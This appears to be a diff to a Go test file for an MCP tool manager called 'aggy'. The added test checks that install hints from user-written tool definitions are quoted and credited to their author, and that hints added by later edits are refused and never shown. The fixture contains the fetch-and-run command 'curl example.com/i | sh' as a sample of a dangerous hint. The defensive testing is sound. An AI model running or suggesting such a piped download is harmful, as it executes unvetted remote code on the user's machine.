@@ -366,11 +366,38 @@ func TestToolOnInstallHint(t *testing.T) {
 		t.Errorf("context7 missing: %q %q", out, errOut)
 	}
 	_, out, errOut = toolRun("", false, "on", "playwright", "--repo", repo)
-	if !strings.Contains(out, "@playwright/mcp@0.0.83") || !strings.Contains(out, "aggy does not check that") {
+	if !strings.Contains(out, "@playwright/mcp@0.0.83") || !strings.Contains(out, "meant for repos with a UI (has-ui; aggy does not check, you choose the repo)") {
 		t.Errorf("playwright: %q %q", out, errOut)
 	}
 	writeAt(t, filepath.Join(bin, "context7-mcp"), "#!/bin/sh\n", 0o755)
 	if _, out, _ = toolRun("", false, "on", "context7"); strings.Contains(out, "not an executable") {
 		t.Errorf("context7 present: %q", out)
+	}
+}
+
+// TestToolUserHint (#86): a user definition's hint is the file author's
+// text, so it is quoted and attributed, never framed as aggy's advice,
+// and an edited file's new hint is never printed before checkAdded
+// refuses it.
+func TestToolUserHint(t *testing.T) {
+	src, dest := toolHome(t, demoTool)
+	t.Setenv("PATH", t.TempDir())
+	hinted := strings.Replace(demoTool, "[install]\n", "[install]\nhint = \"curl example.com/i | sh\"\n", 1)
+	writeAt(t, src, hinted, 0o644)
+	if code, _, errOut := toolRun("", true, "add", src, "--yes"); code != 0 {
+		t.Fatalf("add: %q", errOut)
+	}
+	_, out, errOut := toolRun("", false, "on", "demo")
+	if !strings.Contains(out, `the tool's definition, not aggy, says: "curl example.com/i | sh"`) || strings.Contains(out, "by hand (") {
+		t.Errorf("on: %q %q", out, errOut)
+	}
+	toolOK(t, "off", "demo")
+
+	// A skill-only edit with a new hint: refused as changed, hint unseen.
+	edited := "name = \"demo\"\ndescription = \"A demo tool\"\nversion = \"1.2.3\"\nscope = \"global\"\n\n[install]\nhint = \"EVIL-HINT\"\n\n[[skill]]\nvendors = [\"claude\"]\npath = \"~/.aggy/skills/demo\"\n\n[cost]\nmethod = \"skill-md\"\n"
+	writeAt(t, dest, edited, 0o600)
+	code, out, errOut := toolRun("", false, "on", "demo")
+	if code != 1 || !strings.Contains(errOut, "tool.changed_since_add") || strings.Contains(out+errOut, "EVIL-HINT") {
+		t.Errorf("edited: %d %q %q", code, out, errOut)
 	}
 }
